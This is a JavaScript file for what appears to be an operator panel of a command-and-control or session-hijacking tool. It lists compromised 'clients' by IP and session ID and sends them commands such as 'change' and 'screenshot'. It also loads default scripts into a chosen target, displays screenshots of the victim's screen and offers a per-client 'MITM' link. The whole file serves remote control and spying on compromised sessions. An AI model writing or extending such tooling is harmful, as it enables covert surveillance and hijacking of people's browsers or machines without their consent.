var clients = {}
var currentClient = null

async function loadClientList() {
    try {
        const data = await sendConsole('list');
        clients = JSON.parse(data.text);

        const clientList = document.getElementById('clientList');
        clientList.innerHTML = '';

        for (const index in clients) {
            const client = clients[index];
            const item = document.createElement('div');
            item.className = `client-item ${currentClient === index ? 'active' : ''}`;

            item.innerHTML = `
                <div class="client-info">
                    <span class="ip">${client.ip}</span>
                    <span class="sid">SID: ${client.sid.substring(0, 8)}...</span>
                </div>
                <div class="client-actions">
                    <button id="mitmButton-${index}" class="btn-mitm" disabled="" onclick="window.open('${client.mitmUrl}', '_blank'); event.stopPropagation();">MITM</button>
                </div>
            `;

            item.onclick = () => selectClient(index);
            clientList.appendChild(item);
        }
    } catch (e) {
        console.error("Failed to load clients", e);
    }
}

async function selectClient(index) {
    currentClient = index;
    // Update UI active state
    const client = clients[index];
    const shortSid = client.sid.substring(0, 8);
    document.getElementById('terminalPrompt').textContent = `${shortSid}@${client.ip}:~$`;
    document.getElementById('previewStatus').textContent = `Target: ${client.ip}`;

    await sendConsole("change " + index);
    loadDefaultScripts().then(() => {
        sendConsole("screenshot").then(() => {
            document.getElementById('previewImage').src = `screenshots/${clients[index].sid}.png?t=${Date.now()}`;
        }).then(() => {
            document.getElementById(`mitmButton-${index}`).disabled = false;
        });
    });
}

function togglePreview() {
    document.getElementById('previewImage').classList.toggle('minimized');
}

let networkTimer = null;

function setNetworkTimer(time) {
    if (networkTimer) {
        clearInterval(networkTimer);
    }
    networkTimer = setInterval(loadClientList, time * 1000);
}

function toggleAutoReload() {
    const toggleButton = document.getElementById('autoReloadToggle');
    const reloadIntervalInput = document.getElementById('reloadInterval');
    if (toggleButton.textContent.includes('OFF')) {
        toggleButton.textContent = 'AUTO-RELOAD: ON';
        reloadIntervalInput.disabled = false;
        setNetworkTimer(parseInt(reloadIntervalInput.value));
    } else {
        toggleButton.textContent = 'AUTO-RELOAD: OFF';
        reloadIntervalInput.disabled = true;
        if (networkTimer) {
            clearInterval(networkTimer);
            networkTimer = null;
        }
    }
}

// Polling and Init
document.addEventListener('DOMContentLoaded', function () {
    loadClientList();
    document.getElementById('previewImage').addEventListener('error', function () {
        this.src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4MDAiIGhlaWdodD0iNDAwIj48cmVjdCB3aWR0aD0iMTAwJSIgaGVpZ2h0PSIxMDAlIiBmaWxsPSIjMTExIi8+PHRleHQgeD0iNTAlIiB5PSI1MCUiIGZpbGw9IiM0NDQiIGZvbnQtc2l6ZT0iMjQiIHRleHQtYW5jaG9yPSJtaWRkbGUiPm5vIHByZXZpZXcgYXZhaWxhYmxlPC90ZXh0Pjwvc3ZnPg==';
    });
});